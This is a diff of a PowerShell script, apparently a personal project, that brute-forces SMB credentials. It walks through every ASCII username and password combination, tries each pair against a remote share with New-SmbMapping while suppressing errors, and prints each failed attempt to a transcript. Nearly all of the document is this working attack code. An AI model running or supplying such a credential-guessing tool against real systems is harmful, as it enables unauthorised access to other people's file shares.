@@ -2,10 +2,12 @@
 
 # TODO: Just checks ASCII since the letters are the most used, for more Unicode values a parameter can be added
 $LastASCIINum = 126 
-$FirstASCIINum = 32 # TODO: No need for null char
+$FirstASCIINum = 33
 $MaxLength = 1 
-$OldMaxLength = 4  #TODO: Optimization
+$OldMaxLength = 0
 $MaxLengthInc = 1 # Incrementation value to update the maximum length for username and password
+
+Start-Transcript -path C:\Users\oyku_\Desktop\file2.txt
 
 function updateList{
 param ([int[]]$list)
@@ -17,7 +19,7 @@ for ($i = $list.Length-1; $i -ge 0 ; $i--){
             $list[$i] = $FirstASCIINum
         }
         else{
-            [int[]]$list2 = @($FirstASCIINum) * $list.Length+1  # Increase the length and continue
+            [int[]]$list2 = ,$FirstASCIINum * ($list.Length+1)  # Increase the length and continue
             return $list2
         }
     }
@@ -38,42 +40,46 @@ $out = $null;
 }
 
 function brute {
-$user = $null
-$pass = $null
-$Result = $null
-[int[]]$userPtr =  $FirstASCIINum
-[int[]]$passPtr =  $FirstASCIINum
 
+[int[]]$userPtr =  $FirstASCIINum # username can not be null
+[int[]]$passPtr =  $FirstASCIINum - 1 # password can be null
+$user = createString $userPtr #changes to String
+$pass = createString $passPtr #changes to String
+$Result = $null
 
 # TODO: username can't be null, space and can not use some characters ( " / \ [ ] : ; | = , + * ? < > ) , password does not have null (except just null), 
 #Continue till find a match
 :outer while ($true) {
 
 while ($userPtr.Length -le $MaxLength) {
-    
-    $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
-    if ($Result -ne $null){
-        break
+
+    while ($passPtr.Length -le $MaxLength){ #check pass for this user
+        $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password $pass -EA SilentlyContinue
+        if ($Result -ne $null){
+            break outer
+        }
+        Write-Host "FAILED -> UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
+        $passPtr = updateList $passPtr
+        $pass = createString $passPtr
+    }
+    $userPtr = updateList $userPtr
+    $user = createString $userPtr 
+    if ( $OldMaxLength -eq 0 -or $userPtr.Length -gt $OldMaxLength) {
+        $passPtr =  $FirstASCIINum - 1 # needs to start from the beginning
     }
     else {
-            while ($passPtr.Length -le $MaxLength){ #check pass for this user
-            $passPtr = updateList $passPtr # changes the password - needs return for creation of new array
-            $pass = createString $passPtr #changes to String
-
-            $Result = New-SmbMapping -RemotePath $IPAddr -UserName $user -Password "hackme" -EA SilentlyContinue
-            if ($Result -ne $null){
-                break outer
-            }
-            Write-Host "UserPtr: " $userPtr "User:" $user "PassPtr: " $passPtr "Pass:" $pass
-            }
-        $userPtr = updateList $userPtr # changes the username - needs return for creation of new array
-        $user = createString $userPtr #changes to String
-        $passPtr =  $FirstASCIINum #needs to start from the beginning
+        $passPtr =   @($FirstASCIINum) * ($OldMaxLength+1)
     }
+    $pass = createString $passPtr
 }
+$OldMaxLength = $MaxLength
 $MaxLength += $MaxLengthInc
-$userPtr = $FirstASCIINum # TODO: Optimize
+$userPtr = $FirstASCIINum
+$user = createString $userPtr
+$passPtr =  @($FirstASCIINum) * ($OldMaxLength+1) # No need to check previous with the same usernames, no need to check null anymore since there are other characters
+$pass = createString $passPtr
 }
 }
 
 brute
+Stop-Transcript
